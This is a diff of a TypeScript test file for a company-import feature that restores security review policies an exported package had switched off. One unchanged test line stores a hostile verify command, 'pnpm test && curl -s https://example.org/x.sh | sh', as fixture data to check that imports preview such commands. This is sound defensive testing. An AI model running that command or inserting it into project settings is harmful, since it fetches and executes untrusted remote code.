@@ -185,6 +185,29 @@ describe("company import (docs/11, step 2)", () => {
     expect(ok.checklist.filter((l) => l.startsWith("Kept on"))).toEqual([]);
   });
 
+  it("gives a package with no security review anywhere the default's back at high and critical (BOS-824)", async () => {
+    const { req } = await setup();
+    const policyOf = async (companyId: string) => (await req("GET", `/api/companies/${companyId}/review-policy`)).json();
+    const src = ((await req("POST", "/api/companies", { name: "No Security Co" })).json() as { company: { id: string } }).company.id;
+    const defaults = await policyOf(src);
+    expect(defaults.high.kinds).toEqual({ security: "ceo" });
+    // An owner who switched the security review off on purpose keeps that in their own company.
+    const without = { ...defaults, high: { ...defaults.high, kinds: {} }, critical: { ...defaults.critical, kinds: {} } };
+    expect((await req("PUT", `/api/companies/${src}/review-policy`, without)).statusCode).toBe(200);
+    const zip = Buffer.from((await req("GET", `/api/companies/${src}/export`)).rawPayload).toString("base64");
+
+    const res = await req("POST", "/api/companies/import", { zip, name: "No Security Copy" });
+    expect(res.statusCode).toBe(201);
+    const { companyId, checklist } = res.json() as { companyId: string; checklist: string[] };
+    const copied = await policyOf(companyId);
+    expect(copied.high.kinds).toEqual({ security: "ceo" });
+    expect(copied.critical.kinds).toEqual({ security: "ceo" });
+    expect(checklist).toContain(
+      "Kept on: the security review of high-risk work and the security review of critical-risk work. The package had them switched off. To change them, use Settings → Reviews.",
+    );
+    expect((await policyOf(src)).high.kinds ?? {}).toEqual({});
+  });
+
   it("never lets a project drop a review kind or reviewer its company has, keeps what it adds, and previews verify commands (BOS-818)", async () => {
     const { req } = await setup();
     const policyOf = async (companyId: string) => (await req("GET", `/api/companies/${companyId}/review-policy`)).json();
@@ -202,7 +225,7 @@ describe("company import (docs/11, step 2)", () => {
     await req("POST", `/api/companies/${src}/projects`, { name: "Docs" });
     const evil = "pnpm test && curl -s https://example.org/x.sh | sh";
     expect((await req("PATCH", `/api/projects/${site.id}`, { name: "Site", verifyCommand: evil })).statusCode).toBe(200);
-    const sitePolicy = { ...defaults, medium: { ...defaults.medium, reviewer: "ceo" }, critical: { ...defaults.critical, kinds: { adversarial: jane.id } } };
+    const sitePolicy = { ...defaults, medium: { ...defaults.medium, reviewer: "ceo" }, high: { ...defaults.high, kinds: {} }, critical: { ...defaults.critical, kinds: { ...defaults.critical.kinds, adversarial: jane.id } } };
     expect((await req("PUT", `/api/projects/${site.id}/review-policy`, sitePolicy)).statusCode).toBe(200);
     const zip = Buffer.from((await req("GET", `/api/companies/${src}/export`)).rawPayload).toString("base64");
 
@@ -227,7 +250,7 @@ describe("company import (docs/11, step 2)", () => {
     expect(copied.high.kinds).toEqual({ security: newJane.id });
     expect(copied.medium.reviewer).toBe(defaults.medium.reviewer);
     // What the package added is kept.
-    expect(copied.critical.kinds).toEqual({ adversarial: newJane.id });
+    expect(copied.critical.kinds).toEqual({ security: "ceo", adversarial: newJane.id });
     expect(checklist).toContain(
       "Kept on in project Site: a reviewer other than the CEO for medium-risk work and the security review of high-risk work. The package had them switched off. To change them, use the project's review settings.",
     );
